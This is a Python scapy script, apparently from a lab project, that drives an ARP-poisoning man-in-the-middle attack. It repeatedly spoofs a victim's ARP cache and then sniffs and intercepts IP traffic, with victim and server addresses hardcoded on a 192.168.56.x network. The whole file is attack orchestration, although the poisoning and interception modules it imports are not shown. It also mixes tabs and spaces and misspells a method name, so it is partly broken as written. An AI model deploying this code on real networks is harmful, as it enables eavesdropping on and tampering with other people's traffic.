from scapy.all import * 
from Functions import Functions
from Interceptor import Interceptor
# from ARPPoisoning import *
from ARPPoisoning import ARPPoisoning

functions = Functions()

class ARPStart():

    networkId = ""
    ipVictim = ""
    ipSpoof = ""
    silentMode = False
 
    def __init__(self, networkID, ipVictim, ipSpoof, silentMode):
        self.networkId = networkID
        self.ipVictim = ipVictim
        self.ipSpoof = ipSpoof
        self.silentMode = silentMode
        self.macAttacker = get_if_hwaddr(self.networkId)
        self.macVictim = functions.retrieveMACAdress(networkID="enp0s3", ipConfig="192.168.56.101")
        self.macServer = functions.retrieveMACAdress(networkID="enp0s3", ipConfig="192.168.56.102") 
       

    def startSniffing(self):
        sniff(prn=self.startIntercepting, iface=self.networkId, filter="ip", timeout=20)

    def startIntercepting(self, packet):
	self.interceptor = Interceptor(packet, self.macAttacker, self.ipSpoof, self.macServer, self.macVictim, self.networkId, self.silentMode)
        self.interceptor.interceltARP()

    def spoofing(self):
        ARPPoisoning(self.ipVictim, self.ipSpoof, self.networkId)


    def startARP(self):
        while True:
            self.spoofing()
            self.startSniffing()
